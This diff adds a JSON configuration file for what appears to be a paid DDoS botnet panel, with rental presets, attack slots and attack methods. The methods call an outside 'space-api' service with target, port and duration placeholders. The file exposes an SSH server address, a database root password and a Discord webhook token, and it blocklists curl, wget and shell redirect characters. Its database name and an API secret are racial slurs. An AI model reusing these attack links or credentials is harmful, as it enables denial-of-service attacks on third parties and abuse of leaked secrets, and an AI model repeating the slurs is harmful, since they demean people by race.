@@ -1,0 +1,168 @@
+{
+    "server_config": {
+        "ssh_addr": "107.172.137.175",
+        "private_key": "assets/private_key.pem"
+    },
+    "database": {
+        "host": "localhost:3306",
+        "username": "root",
+        "password": "TcpDerbsC2:~#",
+        "dbname": "fuckniggers"
+    }, 
+    "settings": {
+        "general": {
+            "name": "Avery II. [Beginning]",
+            "developer": {
+                "width": 322,
+                "length": 22
+            }
+        },
+        "themes": [
+            {
+                "name": "default",
+                "description": "a minimalistic and simple botnet",
+                "colour": "[97m"
+            },
+            {
+                "name": "moon",
+                "description": "the original space theme",
+                "colour": "[91m"
+            }
+        ],
+        "blacklists": [
+            ".gov",
+            ".edu",
+            "curl",
+            ".ru",
+            "russia",
+            "wget",
+            ">",
+            "github",
+            "<",
+            "mysql",
+            "51.255.237.151",
+            "localhost",
+            "70.70.143.69",
+            "66.70.198.238",
+            "space"
+        ],
+        "attacks": {
+            "slots": {
+                "max": 10,
+                "enabled": true
+            },
+            "powersaving": {
+                "enabled": true
+            },
+            "spamcheck": {
+                "enabled": false
+            },
+            "enabled": true
+        }
+    },
+    "discord": {
+        "webhook": "https://discord.com/api/webhooks/967435692143706112/7dZMzmsMWFFGsDfi-_KYlA7_IIua-7q7T3kYizi8kQUHO30A5Xm2zB5hTtzBPQr6Y_PK",
+        "image": "https://cdn.discordapp.com/attachments/858480487617921028/858488663398940672/272667f0274eafa2583779f345355be3.png",
+        "enabled": true
+    },
+    "preset": [
+        {
+            "name": "MONTH1",
+            "config": {
+                "maxtime": 200,
+                "concurrents": 2,
+                "expiry": 30
+            }
+        },
+        {
+            "name": "MONTH2",
+            "config": {
+                "maxtime": 200,
+                "concurrents": 2,
+                "expiry": 30
+            }
+        },
+        {
+            "name": "LIFE1",
+            "config": {
+                "maxtime": 200,
+                "concurrents": 2,
+                "expiry": 1337
+            }
+        },
+        {
+            "name": "LIFE2",
+            "config": {
+                "maxtime": 200,
+                "concurrents": 2,
+                "expiry": 1337
+            }
+        },
+        {
+            "name": "RESELLER1",
+            "config": {
+                "maxtime": 200,
+                "concurrents": 2,
+                "expiry": 1337
+            }
+        }
+    ],
+    "attacks": [
+        {
+            "method": "HOME",
+            "config": {
+                "links": [
+                    "https://space-api.cc/api/attack?username=tcp&secret=nigger&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=UDP"
+                ],
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    },
+                    "enabled": false
+                },
+                "slots": {
+                    "max": 2,
+                    "enabled": false
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": false,
+                    "private": false
+                }
+            }
+        },
+        {
+            "method": "MIXBYPASS",
+            "config": {
+                "links": [
+                    "https://space-api.cc/api/attack?username=yourusername&secret=yoursecret&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=MIXBYPASS"
+                ],
+                "maxtime": {
+                    "hard": {
+                        "time": 60,
+                        "enabled": false
+                    },
+                    "soft": {
+                        "time": 30,
+                        "enabled": false
+                    },
+                    "enabled": false
+                },
+                "slots": {
+                    "max": 2,
+                    "enabled": true
+                },
+                "status": {
+                    "enabled": true,
+                    "vip": true,
+                    "private": false
+                }
+            }
+        }
+    ]
+}
